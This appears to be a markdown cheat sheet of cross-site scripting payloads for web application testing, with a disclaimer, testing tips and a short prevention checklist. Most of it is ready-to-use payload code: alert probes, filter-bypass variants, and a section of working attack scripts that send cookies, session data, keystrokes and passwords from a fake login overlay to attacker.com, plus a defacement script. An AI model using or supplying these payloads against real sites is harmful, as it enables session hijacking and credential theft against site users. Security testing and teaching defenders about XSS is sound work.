# XSS Payloads for Testing 🧪

**⚠️ Disclaimer**: These payloads are for educational and testing purposes only. Use only on systems you own or have explicit permission to test.

## Basic XSS Payloads

### Simple Alert Boxes
```html
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert('XSS Vulnerability Found!')</script>
<script>alert(String.fromCharCode(88,83,83))</script>
```

### Different Script Tag Variations
```html
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert('XSS');</script>
<script>alert("XSS");</script>
<script type="text/javascript">alert('XSS')</script>
```

## Event Handler Based XSS

### Image Tags
```html
<img src=x onerror=alert('XSS')>
<img src="javascript:alert('XSS')">
<img src=x onerror="alert('XSS')">
<img/src=x onerror=alert('XSS')>
<img src=x:alert(alt) onerror=eval(src) alt=XSS>
```

### Body Events
```html
<body onload=alert('XSS')>
<body onpageshow="alert('XSS')">
<body onfocus="alert('XSS')">
```

### Input Events
```html
<input type=text onmouseover=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<input onblur=alert('XSS') autofocus><input autofocus>
```

### Other Elements
```html
<svg onload=alert('XSS')>
<iframe onload=alert('XSS')></iframe>
<video><source onerror="alert('XSS')">
<audio src=x onerror=alert('XSS')>
<details ontoggle=alert('XSS')>
```

## Advanced XSS Techniques

### JavaScript Protocol
```html
<a href="javascript:alert('XSS')">Click me</a>
<iframe src="javascript:alert('XSS')"></iframe>
<form><button formaction="javascript:alert('XSS')">Submit</button></form>
```

### Data URLs
```html
<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
<object data="data:text/html,<script>alert('XSS')</script>"></object>
```

### CSS Based XSS
```html
<style>@import'javascript:alert("XSS")';</style>
<link rel=stylesheet href="javascript:alert('XSS')">
<style>body{background:url("javascript:alert('XSS')")}</style>
```

## Filter Bypass Techniques

### Case Variations
```html
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>
<script>Alert('XSS')</script>
```

### Character Encoding
```html
<script>alert('XSS')</script>
<script>alert(&#x27;XSS&#x27;)</script>
<script>alert(&quot;XSS&quot;)</script>
```

### HTML Entity Encoding
```html
&lt;script&gt;alert('XSS')&lt;/script&gt;
&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;
```

### Unicode Encoding
```html
<script>alert('\u0058\u0053\u0053')</script>
<script>alert('\x58\x53\x53')</script>
```

### Hex Encoding
```html
<script>alert('\x58\x53\x53')</script>
<img src=x onerror=\u0061\u006C\u0065\u0072\u0074(1)>
```

## Context-Specific Payloads

### Inside Attributes
```html
" onclick="alert('XSS')" "
' onclick='alert('XSS')' '
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
```

### Inside Script Tags
```html
</script><script>alert('XSS')</script>
';alert('XSS');//
\';alert(\'XSS\');//
```

### Inside Style Attributes
```html
color:red;background:url(javascript:alert('XSS'))
background:url('javascript:alert("XSS")')
```

## DOM-Based XSS Payloads

### URL Fragment Based
```
#<script>alert('XSS')</script>
#<img src=x onerror=alert('XSS')>
#javascript:alert('XSS')
```

### For document.write()
```html
<script>document.write('<script>alert("XSS")<\/script>')</script>
```

### For eval() Functions
```javascript
alert('XSS')
';alert('XSS');//
\';alert(\'XSS\');//
```

## Real-World Attack Scenarios

### Cookie Stealing
```html
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
<script>new Image().src='http://attacker.com/steal?cookie='+document.cookie</script>
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

### Session Hijacking
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://attacker.com/steal', true);
xhr.send('cookies=' + document.cookie + '&url=' + document.URL);
</script>
```

### Keylogger
```html
<script>
document.onkeypress = function(e) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://attacker.com/keylog', true);
    xhr.send('key=' + String.fromCharCode(e.which));
}
</script>
```

### Page Defacement
```html
<script>
document.body.innerHTML = '<h1>Website Hacked!</h1><p>This site has been compromised</p>';
</script>
```

### Fake Login Form
```html
<script>
document.body.innerHTML = `
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;">
    <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;border-radius:8px;">
        <h3>Session Expired - Please Login</h3>
        <input type="text" placeholder="Username" id="fake-user">
        <input type="password" placeholder="Password" id="fake-pass">
        <button onclick="stealCreds()">Login</button>
    </div>
</div>`;

function stealCreds() {
    var user = document.getElementById('fake-user').value;
    var pass = document.getElementById('fake-pass').value;
    fetch('http://attacker.com/steal', {
        method: 'POST',
        body: 'user=' + user + '&pass=' + pass
    });
}
</script>
```

## Testing Tips

### Manual Testing Checklist
1. **Input Fields**: Try payloads in all form inputs
2. **URL Parameters**: Test GET parameters
3. **HTTP Headers**: Test User-Agent, Referer, etc.
4. **File Uploads**: Try HTML files with XSS
5. **Search Functions**: Common XSS target
6. **Error Messages**: Often reflect user input
7. **Contact Forms**: Frequently vulnerable

### Automated Testing Tools
- **OWASP ZAP**: Free security scanner
- **Burp Suite**: Professional web security testing
- **XSStrike**: Python-based XSS detection tool
- **Browser Extensions**: XSS Hunter, Xenotix

### Response Analysis
Look for these in server responses:
- Direct reflection of payload
- HTML encoding of special characters
- JavaScript execution in browser
- Error messages revealing vulnerabilities

## Prevention Quick Reference

### Developer Checklist
- [ ] Input validation on all user data
- [ ] Output encoding (HTML entities)
- [ ] Content Security Policy (CSP) headers
- [ ] Use textContent instead of innerHTML
- [ ] Validate and sanitize URLs
- [ ] Use trusted sanitization libraries
- [ ] Regular security testing
- [ ] Keep frameworks updated

Remember: **Always test responsibly and only on systems you own or have explicit permission to test!** 🔒 